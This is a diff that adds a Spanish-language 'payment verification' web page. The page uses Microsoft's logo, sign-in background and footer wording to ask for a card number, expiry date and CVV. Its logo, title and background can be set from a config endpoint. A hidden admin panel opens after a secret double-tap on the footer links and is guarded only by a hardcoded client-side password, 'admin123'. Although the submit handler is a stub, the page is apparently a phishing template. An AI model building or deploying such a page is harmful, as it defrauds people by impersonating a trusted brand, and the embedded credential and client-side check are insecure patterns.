@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de pago</title>
+  <meta name="description" content="Verificación de pago">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    html, body {
+      min-height: 100vh;
+      width: 100%;
+      overflow: hidden;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-color: #0a0a1a;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+    }
+    .payment-container {
+      width: 100%;
+      max-width: 380px;
+      background: rgba(10, 10, 26, 0.85);
+      backdrop-filter: blur(20px);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+      padding: 40px;
+      position: relative;
+      z-index: 10;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .logo img {
+      height: 40px;
+    }
+    .payment-title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #ffffff;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    .payment-description {
+      font-size: 13px;
+      color: #a0a0b0;
+      text-align: center;
+      margin-bottom: 24px;
+      min-height: 18px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #8c8c9e;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    input.card-number,
+    input.card-expiry,
+    input.card-cvv {
+      width: 100%;
+      padding: 12px 14px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s;
+      font-family: 'Courier New', monospace;
+    }
+    input.card-number:focus,
+    input.card-expiry:focus,
+    input.card-cvv:focus {
+      border-color: #0078d4;
+    }
+    .card-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .card-row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    .card-row .form-group:last-child {
+      max-width: 120px;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-primary:hover {
+      background: #106ebe;
+    }
+    .btn-primary:disabled {
+      background: #6a6a7a;
+      cursor: not-allowed;
+    }
+    .links {
+      margin-top: 16px;
+      text-align: center;
+    }
+    .links a {
+      color: #a0a0b0;
+      font-size: 13px;
+      text-decoration: none;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 11px;
+      color: #6a6a7a;
+      line-height: 1.6;
+    }
+    .footer a {
+      color: #6a6a7a;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    /* Modal de contraseña de admin */
+    .admin-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .admin-modal .modal-content {
+      background: rgba(20, 20, 40, 0.95);
+      border-radius: 12px;
+      padding: 30px;
+      width: 100%;
+      max-width: 320px;
+      text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .admin-modal h3 {
+      font-size: 16px;
+      color: #ffffff;
+      margin-bottom: 16px;
+    }
+    .admin-modal input {
+      width: 100%;
+      padding: 10px 12px;
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      color: #ffffff;
+      font-size: 14px;
+      outline: none;
+      margin-bottom: 16px;
+    }
+    .admin-modal .btn-admin {
+      width: 100%;
+      padding: 10px;
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .admin-modal .btn-cancel {
+      width: 100%;
+      padding: 10px;
+      background: transparent;
+      color: #a0a0b0;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 6px;
+      font-size: 13px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-container">
+    <div class="logo">
+      <img id="loginLogo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+    </div>
+    <div class="payment-title" id="loginTitle">Verificación de pago</div>
+    <div class="payment-description" id="loginDescription"></div>
+
+    <div class="form-group">
+      <label for="cardNumber">Número de tarjeta</label>
+      <input type="text" id="cardNumber" class="card-number" placeholder="0000 0000 0000 0000" maxlength="19">
+    </div>
+
+    <div class="card-row">
+      <div class="form-group">
+        <label for="cardExpiry">Vencimiento</label>
+        <input type="text" id="cardExpiry" class="card-expiry" placeholder="MM/AA" maxlength="5">
+      </div>
+      <div class="form-group">
+        <label for="cardCvv">CVV</label>
+        <input type="text" id="cardCvv" class="card-cvv" placeholder="000" maxlength="4">
+      </div>
+    </div>
+
+    <button type="button" id="payButton" class="btn-primary" onclick="handlePaymentSubmit()">
+      Verificar tarjeta
+    </button>
+
+    <div class="links">
+      <a id="ayudaLink">Ayuda</a>
+      ·
+      <a id="privacidadLink">Privacidad y cookies</a>
+    </div>
+
+    <div class="footer">
+      <a href="#">Términos de uso</a>
+      <br>
+      <span>Usa la exploración privada si este no es tu dispositivo. Más información</span>
+    </div>
+  </div>
+
+  <!-- Modal de acceso admin (doble-tap Ayuda + Privacidad) -->
+  <div class="admin-modal" id="adminModal">
+    <div class="modal-content">
+      <h3>Acceso de administrador</h3>
+      <input type="password" id="adminPassword" placeholder="Contraseña" maxlength="50">
+      <button class="btn-admin" onclick="verifyAdminAccess()">Acceder</button>
+      <button class="btn-cancel" onclick="closeAdminModal()">Cancelar</button>
+    </div>
+  </div>
+
+  <script>
+    // --- Configuración guardada ---
+    var savedSettings = {};
+    var ADMIN_PASSWORD = 'admin123';
+    var adminPasswordFromConfig = '';
+
+    // Contadores para doble-tap
+    var ayudaCount = 0;
+    var privacidadCount = 0;
+    var waitingForPrivacidad = false;
+
+    function getSavedSetting(key, defaultValue) {
+      if (savedSettings[key] !== undefined && savedSettings[key] !== '') return savedSettings[key];
+      if (localStorage.getItem(key) !== null && localStorage.getItem(key) !== '') return localStorage.getItem(key);
+      return defaultValue;
+    }
+
+    async function loadConfig() {
+      try {
+        var res = await fetch('/api/config');
+        if (res.ok) {
+          var data = await res.json();
+          savedSettings = data;
+          Object.keys(data).forEach(function(k) {
+            if (data[k] !== undefined && data[k] !== null && typeof data[k] !== 'object') {
+              localStorage.setItem(k, data[k]);
+            }
+          });
+          // Cargar la contraseña de admin desde config si existe
+          if (data.adminPassword) {
+            adminPasswordFromConfig = data.adminPassword;
+          }
+        }
+      } catch (e) {
+        savedSettings = {};
+        for (var key in localStorage) {
+          if (localStorage.hasOwnProperty(key)) {
+            savedSettings[key] = localStorage.getItem(key);
+          }
+        }
+        adminPasswordFromConfig = localStorage.getItem('adminPassword') || ADMIN_PASSWORD;
+      }
+      applyLoginBackground();
+      applyLoginContent();
+    }
+
+    function applyLoginBackground() {
+      var bgType = getSavedSetting('loginBgType', 'image');
+      var bgColor = getSavedSetting('loginBgColor', '#0a0a1a');
+      var bgGradient = getSavedSetting('loginBgGradient', 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)');
+      var bgImage = getSavedSetting('loginBgImage', 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
+
+      document.body.style.removeProperty('background-image');
+      document.body.style.removeProperty('background-color');
+      document.body.classList.remove('bg-gradient', 'bg-image');
+
+      if (bgType === 'gradient') {
+        document.body.style.background = bgGradient;
+        document.body.classList.add('bg-gradient');
+      } else if (bgType === 'image' && bgImage) {
+        document.body.style.backgroundImage = 'url(' + bgImage + ')';
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.backgroundPosition = 'center';
+        document.body.style.backgroundRepeat = 'no-repeat';
+        document.body.classList.add('bg-image');
+      } else {
+        document.body.style.backgroundColor = bgColor;
+      }
+    }
+
+    function applyLoginContent() {
+      var logoUrl = getSavedSetting('loginLogo', 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg');
+      var title = getSavedSetting('loginTitle', 'Verificación de pago');
+      var description = getSavedSetting('loginDescription', '');
+
+      var logoImg = document.getElementById('loginLogo');
+      if (logoImg) logoImg.src = logoUrl;
+
+      var titleEl = document.getElementById('loginTitle');
+      if (titleEl) titleEl.textContent = title;
+
+      var descEl = document.getElementById('loginDescription');
+      if (descEl) {
+        descEl.textContent = description || '';
+        descEl.style.display = description ? 'block' : 'none';
+      }
+    }
+
+    // --- Doble-tap: Ayuda ---
+    function handleAyudaClick() {
+      ayudaCount++;
+      if (ayudaCount === 2) {
+        ayudaCount = 0;
+        waitingForPrivacidad = true;
+        privacidadCount = 0;
+        // Indicar visualmente (opcional, sutil)
+        var link = document.getElementById('ayudaLink');
+        if (link) {
+          link.style.color = '#0078d4';
+        }
+      } else if (ayudaCount > 2) {
+        ayudaCount = 0;
+        waitingForPrivacidad = false;
+        var link = document.getElementById('ayudaLink');
+        if (link) link.style.color = '';
+      }
+    }
+
+    // --- Doble-tap: Privacidad y cookies ---
+    function handlePrivacidadClick() {
+      if (!waitingForPrivacidad) return;
+
+      privacidadCount++;
+      if (privacidadCount === 2) {
+        privacidadCount = 0;
+        waitingForPrivacidad = false;
+        ayudaCount = 0;
+        // Resetear colores
+        var ayudaLink = document.getElementById('ayudaLink');
+        if (ayudaLink) ayudaLink.style.color = '';
+        // Mostrar modal de password
+        showAdminModal();
+      }
+    }
+
+    function showAdminModal() {
+      var modal = document.getElementById('adminModal');
+      if (modal) {
+        modal.style.display = 'flex';
+        var pwdInput = document.getElementById('adminPassword');
+        if (pwdInput) pwdInput.value = '';
+        if (pwdInput) pwdInput.focus();
+      }
+    }
+
+    function closeAdminModal() {
+      var modal = document.getElementById('adminModal');
+      if (modal) modal.style.display = 'none';
+    }
+
+    function verifyAdminAccess() {
+      var pwdInput = document.getElementById('adminPassword');
+      var enteredPassword = pwdInput ? pwdInput.value : '';
+      var correctPassword = adminPasswordFromConfig || ADMIN_PASSWORD;
+
+      if (enteredPassword === correctPassword) {
+        // Establecer flag de acceso admin
+        sessionStorage.setItem('adminAccess', 'granted');
+        closeAdminModal();
+        // Redirigir al panel de admin
+        window.location.href = 'dashboard.html';
+      } else {
+        // No mostrar mensaje de error visible
+        closeAdminModal();
+      }
+    }
+
+    // --- Formateo de inputs de tarjeta ---
+    function formatCardNumber(e) {
+      var input = e.target;
+      var value = input.value.replace(/\D/g, '');
+      var formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+      input.value = formatted.substring(0, 19);
+    }
+
+    function formatExpiry(e) {
+      var input = e.target;
+      var value = input.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      input.value = value.substring(0, 5);
+    }
+
+    // --- Envío de pago ---
+    function handlePaymentSubmit() {
+      var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      var cardExpiry = document.getElementById('cardExpiry').value;
+      var cardCvv = document.getElementById('cardCvv').value;
+
+      if (!cardNumber || cardNumber.length < 13 || !cardExpiry || !cardCvv) {
+        return;
+      }
+
+      // En este proyecto de demostración, no se valida la tarjeta real
+      // Simplemente permitir al usuario continuar (sin redirigir a dashboard sin auth)
+      // El acceso al panel se hace solo por doble-tap
+    }
+
+    // Cargar configuración al iniciar
+    document.addEventListener('DOMContentLoaded', function() {
+      loadConfig();
+      adminPasswordFromConfig = localStorage.getItem('adminPassword') || ADMIN_PASSWORD;
+
+      // Asignar eventos de doble-tap
+      var ayudaLink = document.getElementById('ayudaLink');
+      var privacidadLink = document.getElementById('privacidadLink');
+      if (ayudaLink) ayudaLink.addEventListener('click', handleAyudaClick);
+      if (privacidadLink) privacidadLink.addEventListener('click', handlePrivacidadClick);
+
+      // Formateo de inputs
+      var cardNumber = document.getElementById('cardNumber');
+      var cardExpiry = document.getElementById('cardExpiry');
+      if (cardNumber) cardNumber.addEventListener('input', formatCardNumber);
+      if (cardExpiry) cardExpiry.addEventListener('input', formatExpiry);
+
+      // Enter en el modal de admin
+      var adminPwd = document.getElementById('adminPassword');
+      if (adminPwd) {
+        adminPwd.addEventListener('keypress', function(e) {
+          if (e.key === 'Enter') verifyAdminAccess();
+        });
+      }
+    });
+  </script>
+</body>
+</html>
